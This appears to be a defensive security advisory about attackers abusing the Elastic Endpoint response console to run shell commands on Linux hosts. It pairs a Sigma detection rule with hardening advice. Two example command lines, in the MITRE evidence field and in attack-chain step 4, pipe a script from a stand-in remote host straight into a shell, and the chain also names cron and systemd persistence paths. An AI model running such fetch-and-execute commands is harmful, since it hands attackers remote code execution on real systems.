---
title: Shell Command Execution via Elastic Endpoint Console
slug: 2026-07-shell-execution-elastic-endpoint
description: Attackers who compromise Elastic Endpoint console access can leverage its legitimate remote support feature to execute arbitrary shell commands on Linux endpoints, turning it into a command and control channel for persistence, tool deployment, and data exfiltration.
date: "2026-07-20T13:15:20Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - command-and-control
  - defense-evasion
  - execution
  - linux
  - endpoint-security
  - remote-access
vendors:
  - Elastic
products:
  - Elastic Endpoint
affected_os:
  - Linux
mitre_ttps:
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1219
    technique_name: Remote Access Tools
    evidence: This rule detects shell executions via Elastic Endpoint. Elastic Endpoint has a built-in response action console that can be used to execute shell commands on compromised systems.
    confidence_band: high
  - tactic_id: TA0005
    tactic_name: Defense Evasion
    technique_id: T1218
    technique_name: System Binary Proxy Execution
    evidence: This rule catches Linux shell sessions launched through the endpoint response console, which matters because that channel can turn a legitimate remote support feature into attacker-controlled command execution on a compromised host.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: An intruder who hijacks console access might run `bash -c 'curl -fsSL http://x/p.sh | sh'` to fetch and execute a script, establish persistence, or quietly stage follow-on tooling.
    confidence_band: high
references:
  - https://github.com/elastic/detection-rules/blob/main/rules/linux/command_and_control_elastic_endpoint_shell_execution.toml
rules:
  - title: Detect Shell Execution via Elastic Endpoint Console
    description: Detects shell command execution on Linux systems that originates from the Elastic Endpoint response console, indicating potential attacker command and control activity or abuse of legitimate features.
    platform: sigma
    severity: high
    tactics:
      - command_and_control
      - defense_evasion
      - execution
    techniques:
      - T1059
      - T1059.004
      - T1218
      - T1219
    data_sources:
      - process_creation
      - linux
rules_count: 1
---

This threat brief outlines the risk of attackers exploiting legitimate Elastic Endpoint console capabilities to execute arbitrary shell commands on compromised Linux systems. While designed for authorized administrative tasks and incident response, the Elastic Endpoint's built-in response console can become a potent command and control (C2) vector if an attacker gains unauthorized access to it. The primary method involves the `elastic-endpoint` process on a Linux host spawning a standard shell (e.g., `bash`, `sh`, `zsh`) with command-line arguments such as `-c` or `--command` to execute a specified string. This allows attackers to fetch and execute malicious scripts, establish persistence through cron jobs or systemd units, deploy additional tooling, or exfiltrate data, effectively subverting the security tool for malicious purposes. The detection focuses on identifying these shell executions originating specifically from the Elastic Endpoint parent process.

## Attack Chain

1. Attacker gains unauthorized access to Elastic Endpoint's administrative console or associated credentials.
2. The attacker leverages the compromised console to remotely initiate a shell command on a targeted Linux endpoint managed by Elastic Endpoint.
3. The `elastic-endpoint` process on the target Linux system acts as a parent process, spawning a new shell process (e.g., `bash`, `sh`, `zsh`) to execute the command provided by the attacker.
4. The shell executes a command string, potentially fetching and immediately running a malicious script from a remote server, such as `bash -c 'curl -fsSL http://malicious.com/payload.sh | sh'`.
5. The malicious script establishes persistence mechanisms, which may include creating new cron jobs (`/etc/cron.*` or user crontabs), rogue systemd units (`/etc/systemd/system`, `/usr/lib/systemd/system`), or modifying startup files (`~/.bashrc`, `/etc/profile`).
6. The attacker utilizes the established persistence and C2 channel to deploy further malicious tools, exfiltrate sensitive data, or perform other objectives, escalating the impact on the compromised system.

## Impact

Successful exploitation allows attackers to gain arbitrary code execution with the privileges of the Elastic Endpoint agent, which can be significant, potentially leading to root-level control. This can result in complete system compromise, unauthorized data access and exfiltration, deployment of ransomware, or lateral movement within the network. Attackers can establish persistent footholds, disable security controls, and evade detection by leveraging a trusted process. The number of potential victims depends on the scope of Elastic Endpoint deployment and the attacker's targeting, affecting any organization utilizing Elastic Endpoint on Linux systems.

## Recommendation

* Deploy the Sigma rule "Detect Shell Execution via Elastic Endpoint Console" to your SIEM to identify suspicious shell activity originating from the Elastic Endpoint process.
* Configure Elastic Endpoint to provide detailed process creation logs, including parent process information and full command lines, to activate the rule above.
* Review the "Possible investigation steps" in this brief to correlate alerts with Elastic Security response-action or audit records to identify who initiated console sessions and the exact commands issued.
* Implement strong authentication, such as multi-factor authentication (MFA), and strict session controls for Elastic Endpoint administration.
* Restrict response console permissions within Elastic Endpoint to a minimal, approved group of administrators.
* Harden Linux egress and application controls to limit the ability of abused shell sessions to fetch tools or execute arbitrary external scripts.
